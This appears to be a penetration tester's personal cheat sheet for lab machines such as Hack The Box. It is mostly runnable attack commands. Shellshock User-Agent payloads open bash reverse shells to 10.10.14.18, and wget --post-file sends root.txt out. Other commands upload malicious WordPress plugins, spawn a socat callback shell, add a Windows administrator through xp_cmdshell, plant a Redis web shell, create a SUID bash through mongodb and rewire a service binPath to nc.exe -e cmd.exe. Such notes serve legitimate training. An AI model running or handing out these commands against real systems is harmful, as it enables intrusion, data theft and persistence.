                    * Version: 6.6.6
                    * Author: Mr Evil
                    * Author URI: http://evil.plugin.com
                    * License: GPL2
                    */
                    ?>
                - zip package together 
                    > zip evilplugin.zip shell.php evilplugin.php
                - Go to http://192.168.89.55/shenzi/wp-admin/plugin-install.php?tab=upload 
                - upload, and activate
                - start reverse shell
                - go to http://192.168.89.55/shenzi/wp-content/plugins/evilplugin/shell.php
            - malicious wordpress plugin upload
                > wordpwn 192.168.49.89 80 N
                - upload the malicious.zip file to wordpress, activate
                - start reverse shell
                - go to http://(target)/wp-content/plugins/malicious/wetw0rk_maybe.php
    - JWT
        - Do the following
            1) Intercept traffic in burp
            2) find jwt token
            3) inspect it with base64 -d or https://jwt.io/
            4) Create your own payload remember the following
                - Test none attack
                    > ./jwt-converter.sh 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6ICIxIiwiZ3Vlc3QiOiAidHJ1ZSIsImFkbWluIjogZmFsc2V9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' '{"typ":"JWT","alg":"none"}' '{"id": "0","guest": "false","admin": true}'
                - Test RSA->H256 attack (if you have a key)
                - possible to brute force?
    - Flask Session Cookie
        - To decode a session cookie:
            >  ./fsct.py -c 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.YOm6uQ.qxr820vJ-G3g_ob-FFizSQYpMNU' decode
        - To bake your own cookie:
            - MUST find the SECRET_KEY value first. could be an evn var, or in app.py in plain text
            - Adjust decoded session from above, and encode your own
                > flask_session_cookie_manager3.py encode -s 'Fl@sKy_Sup3R_S3cR3T' -t '{"logged_in":True}'
                - You may need to play with the -t, adjust "true" "True" true or True. Mess with it. Maybe script something to create multiple cookies

    - Gather all links on site
        1) go to site and select "view source"
        2) copy all content to a enum.html file
        3) run pulllinks
            > pulllinks.sh ./html-source.html
            > pulllinks.sh ./html-source.html nofilter





    - SSH
        ssh2ngjohn.py 
            - Look at the page source for "<meta name="generator" content="Wordpress VERSION" />
        - plugins
            - Can be found through source code or in http://10.10.10.37/plugins or /wp-content/plugins
        - theme
            - can be found in page source, search for "theme"
    - phpmyadmin
        - find version in page source
    - droopescan
        > droopescan scan drupal -u http://$ip
    - shellshock / shell shock
        - Open up burp and intercept a login request on the page, check the header to make sure its being processed by .cgi
        - You could adjust the "User-Agent:" field with the repeater, example code:
            - Regular payload:
                > User-Agent: () { :; }; echo; /usr/bin/id
            - Blind Payload:
                - Start an HTTP server up
                > User-Agent: () { :; }; echo; /usr/bin/wget http://10.10.14.18
                > User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1
                - If this does not work try a known port:
                > User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.18/443 0>&1
            - You can use Burp suite as well
                - Intercept payload with proxy
                - Change user agent to the following
                    "User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/10.10.14.18/4444 0>&1"
    - heartbleed
        - Must check if site is vuln to heart bleed
            > nmap -p 443 --script ssl-heartbleed 10.10.10.79
        - use the python script to gather data
            > python heartbleed.py | grep -v "00 00 00 00 00 00"
        - create sequence for output
            > for i in $(seq 1 100000); do python heartbleed.py 10.10.10.79 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00" > data_dump/data_dump$i; done

### Windows IIS
    - Default directories
        - C:\inetpub\wwwroot

### Apache Tomcat Hacks
    - The default web maanger page = http://10.10.10.95:8080/manager/html
        - When logging in it may prompt you to enter a new password, for 7.0 the default was "-U tomcat -P s3cret"
    - tomcatWarDeployer
        > python tomcatWarDeployer.py -U tomcat -P s3cret -v -p 4444 -H 10.10.14.18 10.10.10.95:8080

## ipsec
    - ike-scan 
        > ike-scan 10.10.10.116

## finger
    > cd /home/dave/hackthebox/SystemsHacked/legacy-lin-sunday-10.10.10.76-DONE/finger-user-enum/
    > ./finger-user-enum.pl -U /usr/share/seclists/Username/Name/names.txt -t 10.10.10.76 -v > foundfingers

## SNMP enumeration
    - SNMP commands
        > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt
        > snmp-check -c public 10.11.1.227
        > snmpwalk -c public -v1 10.11.1.227 1.3.6.1.2.1.6.13.1.3

## SAMBA/NetBIOS enumeration
    - nmap
        - ls -la /usr/share/nmap/scripts/ | grep -e "smb"
        > nmap -p139,445 -T4 -oN smb_vulns.txt -Pn --script 'not brute and not dos and smb-*' -vv -d 192.168.1.101
        > sudo nmap --script smb-vuln* -p 139,445 192.168.1.101
        > sudo nmap --script smb-enum-shares.nse -p445 10.10.10.123
        > sudo nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse $ip 

    - NetBIOS commands
        > nmblookup -A $ip
        > sudo nbtscan -r 10.11.1.0/24
    - SAMBA (SMB) comamnds
        - List samba shares
            > echo exit | smbclient -L \\\\192.168.1.101
            > nmap --script smb-enum-shares -p 139,445 192.168.1.101
        - smbmap
            > smbmap -H $ip0
            > smbmap -H $ip0 -u guest -p password
            > smbmap -H $ip0 -P 445 -R --skip
        - smbget
            > smbget -R smb://$ip0/sudo Replication
    - smb version
        - go into ~/notes/exam/smbver.sh
        - edit smbver.sh to add the specific interface to send packats out of.
        - sudo ./smbver.sh $ip 
        - Could also run a nmap script
            > sudo nmap -p 445 --script smb-protocols 192.168.1.38
    - enum4linux
        > enum4linux -a 10.10.10.161
        > enum4linux -u 'guest' -p '' -a 192.168.1.101
    - enum4linux nextgen
        > enum4linux-ng.py 192.168.125.131 -oY _enum4linux.out

## WINRM
    - nmap
        > nmap -p 5985 -sV 10.10.10.161

## NFS enumeration
    - NFS enumeration:
        > nmap -v -p 111 10.11.1.0/24 -oG rpcbind.txt
        > nmap -sV -p 111 --script=rpcinfo 10.11.1.0/24
        > nmap -p 111 --script nfs* 10.11.1.72 
        > showmount -e 10.11.1.72

## .Net Framework 
    - Windows .net framework lookup (run from windows)
        > reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

## VOIP
    - SIP
        - sipvicious
            - Scan system
                > svmap 10.10.10.7
            - Map out extensions

## Oracle RDBMS
    - ODAT
        - Check everything
            > odat all -s 10.10.10.82 -p 1521
        - Upload a file
          NOTE: YOU MUST set the FULL PATH to the file if just useing "odat"
            > python3 ./odat.py utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --putFile 'C:\inetpub\wwwroot\' 'test.txt' /tmp/test.txt --sysdba 
            > odat utlfile -s 10.10.10.82 -d XE -U SCOTT -P tiger --putFile 'C:\inetpub\wwwroot\' 'hacked.html' /home/dave/hackthebox/SystemsHacked/legacy-win-silo-10.10.10.82/hacked.html --sysdba 
    - tnscmd10g
        > tnscmd10g status -h 10.10.10.82 -p 49160
        > tnscmd10g version -h 10.10.10.82 -p 49160
    - oscanner
        > sudo oscanner -s 10.10.10.82 -P 1521


## Printers (IPP CUPS)
    - PRET
        > python ~/Downloads/GITHUBSTUFF/PRET/pret.py 192.168.146.98 -s ps



## zookeeper
    - zkcli
        > zkcli -s "192.168.146.98:2181"
            - get, ls commands (run help to get info)
        > telnet 192.168.146.98 2181
            > dump: Lists the outstanding sessions and ephemeral nodes. This only works on the leader.
            > envi: Print details about serving environment
            > kill: Shuts down the server. This must be issued from the machine the ZooKeeper server is running on. (Haven't tried this one)
            > reqs: List outstanding requests
            > ruok: Tests if server is running in a non-error state. The server will respond with imok if it is running. Otherwise it will not respond at all.
            > srst: Reset statistics returned by stat command.
            > stat: Lists statistics about performance and connected clients.

## IDENT
    - connection
        > telnet 192.168.190.60 113
    - enumerate users
        > ident-user-enum 22 113 5432 8080 10000

# VPN (IPSEC / IKE) connections
-------------------------------
## Strong swan  
    > vi /etc/ipsec.conf
        - This file will need to be edited with the correct settings. "conceal"
          was a htb machine, the settings are for the specific ike, esp, and 
          key exchange settings. enumerate to figure out how to configure
          "left" is your IP
          "right" is the gateway (box) you are connecting to, also adjust 
          "rightsubnet"
    > vi /etc/ipsec.secrets
        - This file is the actual PSK password to use, must be in plain text.
    - sudo ipsec start
    - sudo ipsec conceal up
    - Once everything is connected ( should read connection 'conceal' established successfully )
    - You can now try to enumerate again.


# Clients:
----------
    - ssh(22) for using older ciphers
        - Using a different suite
            > ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@10.10.10.7
            - or edit ~/.ssh/config
                - add the following
                - Host 10.10.10.76
                    KexAlgorithms +diffie-hellman-group1-sha1
                - sudo systemctl restart sshd
        - Using a differnt port
            > ssh -p 22022 root@10.10.10.76
        - Using a users private key
            - Copy private key to a file. Name it whatever. Make sure to get rid of any extra spaces. Keep the "BEGIN" and "END" comments in the file.
            > chmod 600 <file name>
            > ssh amrois@10.10.10.43 -i privkeyfile.rsa
        - Create a user with no password, SSH to that user (on kali from victem), good for scping files over
            > vi /etc/ssh/sshd_config
                - Change "PasswordAuthentication yes"
                - Change "PermitEmptyPasswords yes"
            - save and restart sshd
                > systemctl restart sshd
            - create user with no password
                > adduser removeme
                > sudo passwd -d removeme
            - SSh to yourself with no password 
                > ssh removeme@<YourkaliIP> -o StrictHostKeyChecking=accept-new"
                >  ssh max@192.168.69.100 -i id_rsa scp -o "StrictHostKeyChecking=accept-new" -P 222 removeme@192.168.49.69:/tmp/authorized_keys ./.ssh/authorized_keys
        - Create .ssh dir and authorized keys for easy access
            > mkdir ~/.ssh/; touch ~/.ssh/authorized_keys; chmod 700 ~/.ssh; chmod 600 ~/.ssh/authorized_keys
            - Add your id_rsa.pub key to authorized keys
            - should be able to ssh to the system with no password

    - webDAV(80) cadaver client commands
        - Make sure nmap scan comes back with webdav
        - When performing a "GET" file format must be supported (TXT for output files)
        > cadaver http://10.10.10.15
        > PUT shell.txt
        > MOVE shell.txt shell.aspx
        - If you cant MOVE do the following:
            > put tcp443meterp.asp tcp443meterp.txt
            > copy tcp443meterp.txt tcp443meterp.asp;.txt
    - WGET(80) client commas
        > wget http://$ip/filetodownload.txt -O /tmp/filetodownload.txt
        > chmod 777 /tmp/filetodownload.txt
        - download and output to specific place
            > wget -O google-wget.txt www.google.com
            > sudo wget -O /root/troll http://10.10.14.18:5555/troll
        - send contents of a file with wget to nc 
            - On listening server
                > sudo nc -nlvp 80 > root.txt
            - Onosystem sending
                > sudo /usr/bin/wget --post-file=/root/root.txt 10.10.14.18
        k download entire site:
            wget --recursive --page-requisites --adjust-extension --span-hosts --convert-links --restrict-file-names=windows --domains yoursite.com --no-parent http://10.10.10.75/nibbleblog/
            wget \
                --recursive \ # Download the whole site.
                --page-requisites \ # Get all assets/elements (CSS/JS/images).
                --adjust-extension \ # Save files with .html on the end.
                --span-hosts \ # Include necessary assets from offsite as well.
                --convert-links \ # Update links to still work in the static version.
                --restrict-file-names=windows \ # Modify filenames to work in Windows as well.
                --domains yoursite.com \ # Do not follow links outside this domain.
                --no-parent \ # Don't follow links outside the directory you pass in.
                    yoursite.com/whatever/path # The URL to download
    - fetch(80) client commands
        > fetch http://10.10.14.28:8088/grouping
    - curl(80) client commands
        - SImple get to server to see reply
            >curl -v http://$ip/home.php
        - GET
            - Get and write to a file
                > curl https://example.com -k -o my.file
                > curl http://example.com -s -o my.file
            - Get and write to stdout
                > curl -O google-wget.txt www.google.com
        - POST
            > curl -d "user=user1&pass=abcd" POST http://example.com/login
        - POST with --data
            > curl -X POST --data "code=os.system('socat TCP:192.168.49.153:80 EXEC:bash')" http://192.168.153.117:50000/verify --proxy 127.0.0.1:8080
        - SEND FILE
            > curl --form "fileupload=#myfile.txt" https://example.com/resource.cgi
        - How to change the version of TLS
            > sudo vi /etc/ssl/openssl.cnf
            - Change "MinProtocol = TLSv1.2" to "MinProtocol = TLS1.0"
            - Save and run again
    - VBS wget script(80) for windows commands
        - copy code from ~/notes/exam/wget.vbs to windows, name "wget.vbs"
        > cscript wget.vbs http://192.168.1.156/filesharedonhttpserver.txt
    - FTP(21) client commands
        > ftp 10.10.10.11
        > ftp 10.10.10.11 33021
        -lftp
            - Auto login
                > lftp -u ftpuser,ftppassword sftp://10.10.10.202/conf-backups
                > lftp -u anonymous sftp://10.10.10.202/conf-backups
                > lftp -u anonymous ftp://10.10.10.202:1221
                - you may need to se passive mode false 
                > lftp -e "set ftp:passive-mode false" -u admin,admin 192.168.69.56
                - Other options to disable if not working
                    set ftp:ssl-allow false
                    set ftp:passive-mode off
                    set ssl:verify-certificate no
            - Auto login / passive mode
                > lftp -e 'set ftp:passive-mode true' -u anonymous 192.168.239.68
            - Delete files with globbing
                > glob -a mrm -rf myfiles*
            - Mirror
                > lftp -e "mirror -R /backups ./conf-backups" -u ftpuser,ftppassword sftp://10.0.8.202
            - Find recursivly (after connecting with lftp)
                > find -l
        - Recusivly download all files
            > wget -r ftp://anonymous:@192.168.153.127:30021

    - SCP(22) client commands
        > transfer to > scp file.txt username@$ip:/tmp
        > transfer from > scp username@$ip:/tmp/file .
    - TFTP(69) client commands
        - Windows:
            > tftp -i 192.168.119.135 put bank-account.zip
        - Linux:
            > tftp 192.168.119.135 put bank-account.zip
    - NFS(111, redirect 2049):
        - Configuration file
            - /etc/exports
        - List mount points
            > showmount -e 10.10.10.76
        - Check version of rpc running
            > rpcinfo -p 192.168.1.193
                - Check if mountd is running
        - List users on system (like Finger) 
            > rusers -al 10.10.10.76
        - Mount on specific port
            > mount > sudo mount -o port=34505 -t nfs 10.10.10.76:/some_directory /mnt/test
        - other commands
            > mount > sudo mount -t fts 10.10.10.76:/home ~/nfs-share
            > mount > sudo mount -t nfs -o nfsvers=3 10.11.1.72:/home ~/nfs-share
        - create user with UID to access mount
            > adduser pwn
            > sudo sed -i -e 's/1001/1014/g' /etc/passwd
        > umount > sudo umount -f -l ~/nfs-share
    - SMTP(25):
        - connect
            > telnet 10.11.1.217 25
            > nc 10.11.1.217 25
                > HELO
                > HELO aaa
                - Verify users
                    > VRFY <user>
                - Verify with recipt
                    > MAIL FROM: <valid email address>
                    > RCPT TO: <email address to test>
                - Send an email
                    > MAIL FROM: <valid email address>
                    > RCPT TO: <email address to test>
                    > DATA
                        - Type whatever you want, end with a newline starting wtih "." to end and send at the same time
                    

        > SMTP-VRFY root 10.11.1.217 25
        - Windows server ntlm check
            > nmap -p 25 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=htb.local 10.10.10.51 -d
        - smtp-user-enum
            - VRFY (check for users)
                > smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 11.10.10.51 | tee _smtp_vrfy_enum
                > smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.51 | tee _smtp_expn_enum
                > smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.51 | tee _smtp_rcpt_enum
            - Check for users email address
                > smtp-user-enum -M VRFY -D mail.ignite.lab -u raj -t 192.168.1.107
        - nmap
            > nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={EXPN,VRFY,RCPT} -p 25 10.10.10.51
        - ismtp
            > ismtp -h 192.168.1.107:25 -e /usr/share/seclists/Usernames/Names/names.txt
        - swaks
            > swaks --to root@10.10.10.51 --server 10.10.10.51
    - SMTPS(465):
        - connect
            > openssl s_client -crlf -connect smtp.mailgun.org:465
    - POP3(110):
        - connect
            > nc -nv 10.10.10.51 110
        - enumerate users
            - telnet 10.10.10.51 110
                > USER admin
                > PASS userpassword
                > LIST 
                > RETR 1
        - brute force
            - nmap -p 110 --script=pop3-brute 10.10.10.110
        - ntlm info
            - nmap -p 110 --script pop3-ntlm-info 10.10.10.51

    - POP3 secure (995):
        - connect
            > openssl s_client -connect 10.10.10.51:995 -crlf -quiet 
        - ntlm info
            > telnet 192.168.103.39 143
            > a1 AUTHENTICATE NTLM

    - IMAP (143)
        - connect
            > nc -nv 192.168.103.39 143
        - Login
            > A001 login $user <password>

    - IMAP secure (993)
        - connect
            > openssl s_client -connect 192.168.103.39:993 -quiet
            > ncat --ssl 192.168.103.339 993



    - SNMP(161):
        > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt
        > snmp-check -c public 10.11.1.227
        > snmpwalk -c public -v1 10.11.1.227 1.3.6.1.2.1.6.13.1.3
        > snmp-walker filewithips communitystring
        - Intersting Object IDs (OID) [Windows]
            - 1.3.6.1.4.1.77.1.2.25 -- Windows object ID for users
            - 1.3.6.1.2.1.25.4.2.1.2 -- Windows running processes
            - 1.3.6.1.2.1.6.13.1.3 -- Windows open TCP ports
            - 1.3.6.1.2.1.25.6.3.1.2 -- Windows installed software
        - Bruteforce SNMP:
            > sudo nmap -sU --open -p 161 10.11.1.0/24 -oG open-snmp.txt && nclean open-snmp.txt > ips2
            > onesixtyone -c community-names-word-list.txt -i list-of-ips.txt
    - smb(445) client commands:
        - Config location
            - /etc/samba/smb.conf
        - Mounting
            - Linux
                - Change username version
                    > sudo vi /etc/samba/smb.conf
                    > change "min protocol"
                    > sudo systemctl restart smbd.service
                > mount > sudo mount -t cifs //10.11.1.101/print$ /mnt
                > mount > sudo mount -t cifs -o username=guest '\\10.11.1.101\wwwroot' /mnt/
                or
                > mount > sudo mount.cifs '//$ip/Shared' /mnt/ -o username=guest 
                > umount > sudo umount -f -l /mnt
                > list mounts > cat /proc/mounts
            - Windows
                > \\10.10.14.18\smb\file-to-download.exe
        - sambaclient
            > smbclient -U 'tyler%password' //10.10.10.97/newsite
                ( this may work too) > echo exit | smbclient -N -L \\\\$ip
            > put test.txt
            > get filetodownload.txt
        - psexec.py (requires a writable smb share, but will give shell. Requires user / password)
            > psexec.py active.htb/svc_tgs@$ip0
        - smbexec.py (rpc and smb, but will give shell. Requires user / password)
            > smbexec.py active.htb/svc_tgs@$ip0
        - wmiexec.py
            > wmiexec.py active.htb/svc_tgs@$ip0 
        - magic script
            - links:
                - https://www.oreilly.com/openbook/samba/book/ch08_02.html
                - https://samba.samba.narkive.com/3wKX7vIg/magic-script-problem
            - You need to get access to /etc/samba/smb.conf. Check if "magic script" is used under a share
              if so you can upload a script with that name to any SUBDIRECTORY (Not root path)
            - create shell script to ping you
            - Connect with samba client with specific user
            - upload the script to a subdirectory, should run automatically, and then delete itself. 
              if the script is running a revrese shell, the script will remain until you close the session. 
        - Loook for smbpasswd files!

    - rsync(873) client commands:
        - Enumerate:
            > nc -nv 192.168.131.126 873
                - Banner should show, type same thing
                > @RSYNCD: 31.0
                > #list
                - Should list all directories
                - connect again, type banner, now type the shared folder name. if "@RSYNCD: OK" displays you can access without password
            > nmap -sV --script "rsync-list-modules" -p 873 192.168.131.126
        - Pull files
            > mkdir rsync/
            - The following will copy over all files and folders locally to your system
            - No password
                > rsync -av rsync://192.168.131.126/fox ./fox
            - With password
                > rsync -av rsync://username@192.168.131.126/fox ./fox
        - Put files
            > rsync -av home_user/.ssh/ rsync://192.168.131.126/fox/.ssh
        
    - ms sql client commands
        > sqsh -S 10.11.1.31 -U sa -P password -D database
        - Get a list of current databases
            > SELECT name FROM master.sys.databases
            > go
        - EXEC sp_databases
        - Manually enable sp_cmdshell
            1> SP_CONFIGURE 'show advanced options', 1
            2> go
            Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
            (return status = 0)
            1> reconfigure
            2> go
            1> SP_CONFIGURE 'xp_cmdshell', 1
            2> go
            Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
            (return status = 0)
            1> reconfigure
            2> go
        - Create an admin user
            > EXEC master..xp_cmdshell 'type C:\Users\Administrator\Desktop\proof.txt'
            > go
            > EXEC master..xp_cmdshell 'net user /add cooldude password123'
            > go
            > EXEC master..xp_cmdshell 'net localgroup administrators cooldude /add'
            > go
    - mysql client commands
        > mysql -h 10.11.1.111 -u root -p
        > mysql -h 10.11.1.111 --port 330006 -u root -p
        > show databases;
        > use users;
        > SHOW TABLES;
            > select * from TABLE;
            or to view a table that is too big
            > select * from TABLE\G
        > CREATE TABLE <table name> (id VARCHAR(20), firstname VARCHAR(20), lastname VARCHAR(20), username VARCHAR(8), email VARCHAR(35), password VARCHAR(25));
        > INSERT into <table name> (id, firstname, lastname, username, email, password) VALUES (‘1’, ‘Yeah’, ‘Hub’, ‘yeahhub’, ‘yeahhub@gmail.com’, ‘123456’);
        - Convert base64 passwords ("username" is the users column in the table, "password" password column "users" is the table)
            > SELECT username, CONVERT(FROM_BASE64(FROM_BASE64(password)),CHAR) FROM users;
    - sqlplus client commands (used for oracle)
        - Connect as regular user
            - sqlplus username/password@<serverip>/<DBMS>
                > sqlplus scott/tiger@10.10.10.82:1521/XE
        - Connect as sysdba
            - sqlplus username/password@<serverip>/<DBMS>
                > sqlplus scott/tiger@10.10.10.82:1521/XE as sysdba
        - PLSQL commands:
            > select name, passwd from sys.EXU8USRU;
            > select * from user_role_privs;
            > select * from v$version;
            > select * from all_users;
            > SELECT * FROM USER_SYS_PRIVS; 
            > select * from user_tab_privs;
    - postgres sql
        - Connect to the server remotely
            > psql -h 192.168.190.60 -U postgres -W 
            > psql -h 192.168.190.60 -U postgres -W postgres -p 5437
        - commands
            - List databases
                > \list
            - use a database
                > \c <database name>
            - list tables
                > \d
            - get users roles
                > \du+
        - psql cmd execution
            > psql-mass-rce.py 192.168.91.47 --port 5437 --command "whoami"
    - mongodb (27017):
        > mongo --host 192.168.69.69
        > mongo --host 192.168.69.69 --port 12345
        > db
        > use <db name>
        > mongo -p password -u mark scheduler
        - once in the scheduler add a line to create suid binary in /tmp
            > db.tasks.insert( { "cmd": "/bin/cp /bin/bash /tmp/puckbash; chmod u+s /tmp/puckbash;" } );
        - run binary to be said user
            > /tmp/puckbash -p

    - rpc client commands (135)
        > rpcinfo -p 192.168.1.197
            - Check out all the services running under rpc, a few that are exploitable are "YP", "ttdserver" and "cmsd"
        - Logon on with default creds
            > rpcclient -U "" 192.168.1.197
        - Logon with user creds
            > rpcclient -U dave%password -c "queryusers dog" 192.168.1.197
        - rpc commands
            - look up all users
                > enumdomusers
            - look up all groups
                > enumdomgroups
            - look up users
                > queryuser $user
            - look up domain info
                > querydominfo
            - lookup privledges
                > enumprivs
        - winexe
            > winexe -U '.\administrator%u6!4ZwgwOM#^OBf#Nwnh' //10.10.10.97 cmd.exe
    - winrm(5985)
        - evilrm
            - https://github.com/Hackplayers/evil-winrm
            > evil-winrm -i 10.10.10.82 -u scott -p 'tiger'
    - James Admin (4555)
        > nc 10.10.10.51 4555
    - finger(79)
        - list all users
            > finger @10.10.10.76
        - Other finger commands to exploit system
            > finger user@10.10.10.76
            > finger 0@target.host
            > finger .@target.host
            > finger **@target.host
            > finger user@target.host
            > finger test@target.host
        - finger bounce
            > finger@finger-server-ip@yourip
        - injection
            > finger "|/bin/id@10.10.10.76"
    - redis(6379):
        - Access with no password
            > redis-cli -h 192.168.91.93
        _ Access with password
            > redis-cli -h 192.168.91.93 -a MyPaSWoRd123
        - Commands
            - Delete all keys in database
                > flushall
            - Check database size
                > dbsize
            - seach for a directory path
                > config get dir <directory path>
            - dofile check files
                > redis-cli -h 192.168.91.93 -p 6379 eval "dofile('/etc/passwd')" 0
                    - Try varations
                        > EVAL dofile('/etc/passwd') 0
        - web shell
            - List of commands: https://redis.io/commands/info
            > redis-cli -h 192.168.187.69
            > info
            > config set dir /var/www/html
            > config set dbfilename redis.php
            > set test "<?php phpinfo(); ?>"
            > save
            - now access the site to see if if the file is avaialble 
        - ssh key load
        - cronjob 
        - module load
            - On kali the directory ~/Downloads/GITHUBSTUFF/RedisModules-ExecuteCommand alread has the module.so compiled.
            - upload it to the server, and run this in redis
                > flushall
                > MODULE LOAD /location/of/module.so
                - Execut commands now with
                > system.exec "whoami"
        - master / slave (Works on only version 5.0.9 and lower
            - https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
            > cd ~/Downloads/GITHUBSTUFF/redis-rouge-server
            - start reverse shell
                > nc -nlvp 8080
            - start attack
                > ./redis-rogue-server.py --rhost 192.168.228.69 --lhost 192.168.49.228 --lport 6379
                    - Make sure "lport" is not being used by any other port.
                    - Choose "r"
                    - Choose your IP
                    - Choose 8080 for port

# Host PE 
==================

# Windows PE section
--------------------
*Windows PE Steps*
1) Run the following commands, figure out who you are with rights
    > whoami
    > whoami /priv
        - Look for 
        - SeImpersonatePrivilege, SeAssignPrimaryPrivilege (RoguePotato, JuicyPotato)
        - SeBackupPrivilege (Can extract Hashs (SAM and SYSTEM), then pass the hash)
        - SeRestorePrivilege (Can modify services, overwrite DLLs, modify registry, etc.)
        - SeTakeOwnershipPrivilege (Take ownership of a object (WRITE_OWNER), adjust ACL, and grant write access)
        - Others more advanced
            - SeTcbPrivilege
            - SeCreateTokenPrivilege
            - SeLoadDriverPrivilege
            - SeDebugPrivilege
    > whoami /groups
3) run winpeas
    > certutil.exe -urlcache -split -f http://192.168.19.21:135/winPEASx64.exe C:\Users\xavier\Downloads\winPEASx64.exe
    > .\winpeasany.exe fast searchfast cmd
    - Then run winpeas slow and aggresive to a file
        > .\winpeasany.exe > winpeas.out
4) run systeminfo
    > systeminfo > sysinfo.out
5) Transfer over nc.exe to transfer files back to kali
6) Transfer sysinfo.out, and winpeas.out to kali for further examination
    - netcat (From windows to kali):
        > kali > nc -l -p 4443 > root.txt
        > Windows > nc.exe -w 3 10.10.14.18 4443 < root.txt
7) ru
8) perform a quick look around the following
    - Files in the C:\User\<YOU> folder
    - Check in C:\ (any weird files or folders?)
    - Check in "C:\Program Files" (any weird files or folders?)
    - Check in "C:\Program FilesX86" (any weird files or folders?)
9) Make note of specific ports that are open and available to use!!!
10) Start to dig through every part of whats below to find something vulnerable.
    - try reg exploits / service exploits first
    - search for admin processes, use searchsploit for those processes / applications running
11) If you still cant get escallation, reread through your entier enumeration
12) IF all else fails its time to look into kernel exploits from windows-exploit-suggester

************

## windows manual enumeration:
    - This site is very helpful!!!
        - https://github.com/frizb/Windows-Privilege-Escalation
        - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
    - Check all directoreis of user (Downloads, Documents, Pictures, etc.)!!111
    - Windows cmd commands
        - Search for file
            > where /R c:\ bash.exe
        - Search for a file in current directory and all sub directories
            > dir /s *.py
        - Edit (Does not work everywhere)
            > edit.exe file.txt
        - show first 16 lines of a file
            > type myfile.txt | findstr/n ^^|findstr "^[1-9]: ^1[0-6]:"
        - Information about the user account being used
            - Your name
                > whoami
            - Permissions
                > whoami /priv
            - accesschk.exe (Must upload this to windows to run)
                - Check all services that are in a specific security group
                    > accesschk.exe /accepteula -ucqv * | findstr AUTHORITY\Authenticated
                        - Find any service with "RW"
                - Check permissions on a service (Start, stop or change)
                    > .\accesschk.exe /accepteula -uwcqv user daclsvc
                    > .\accesschk.exe /accepteula -ucqv user * | findstr /i /L /c:"R  " /c:"RW " /c:"W  " /c:"START" /c:"STOP"
                - Check if you can start or stop the service
                    > .\accesschk.exe /accepteula -ucqv user unquotedsvc
                - Check if you have write permissions for each directory in the path
                    > .\accesschk.exe /accepteula -uwdq C:\
                - Check permissions on a registry service
                    > .\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
                - Check permissions of executable
                    > .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
                - Check permissions if you can write or append to script
                    > .\accesschk.exe /accepteula -quv user "C:\Devtools\CLeanup.ps1"
                - Check permissions of directory
                    > .\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
            - All groups you are apart of (and security groups)
                - Use this link for information on windows groups
                    https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers
                > whoami /groups
            - View same group information from a group policy perspective
                > gpresult /V
                    - search for "The user is a part of the following security groups"
            - Check file permissions (look at groups "medium")
                > dir /q /ad
                > icacls <file>
                - assign integrity level (must be admin)
                    > icacls asd.txt /setintegritylevel(oi)(ci) High
        - Info about other users
            - For yourself
                > net user 
            - For another user
                - Show groups a user is in
                    > net user $user
                    > gpresult /USER $user /V 
                    > net user $user /domain
        - Info about groups built on system
            - List all groups
                > net localgroup
            - View users in group
                > net localgroup groupname
        - IP info
            > ifconfig /all | more
        - Port info
            > netstat -ano
        - Gather windows version
            > powershell -c Get-ComputerInfo -Property "WindowsVersion"
        - Gather System info
            > systeminfo
            > systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        - Check architecture
            > set pro
            > wmic OS get OSArchitecture
            - In powershell
                > $env:PROCESSOR_ARCHITECTURE
        - Writeable locations
            - Checking integrity levels (look at groups "medium")
                > icacls <file>
                - assign integrity level (must be admin)
                    > icacls asd.txt /setintegritylevel(oi)(ci) High
            - Test where you can write to 
                > echo test > test.txt 
                    - If you get an "Access is denied" you cannot write 
                > icacls C:\folder\to\check
                    - If "BUILTIN\Users" shows "WD" you can write data/add files.
        - service commands
            - Query configuration of service
                > sc qc upnphost
                > sc qc SSDPSRV
                > sc qc SSDPSRV start= auto
            - Query current status of service
                > sc query upnphost
            - Change service
                > sc config upnphost obj= ".\LocalSystem" password= ""
                > sc config upnphost binPath= "C:\Inetpub\nc.exe 192.168.119.135 -nv 4444 -e C:\WINDOWS\System32\cmd.exe"
            - Start or stop service
                > net start upnphost
                > net stop upnphost
        - Check registry for credentials
            > reg query HKLM /f pass /t REG_SZ /s
            - example of output
                HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
                    CurrentPass    REG_SZ    TwilightAirmailMuck234


## Windows auto enumeration:
    - windows-exploit-suggester (kernel)
        - Update database
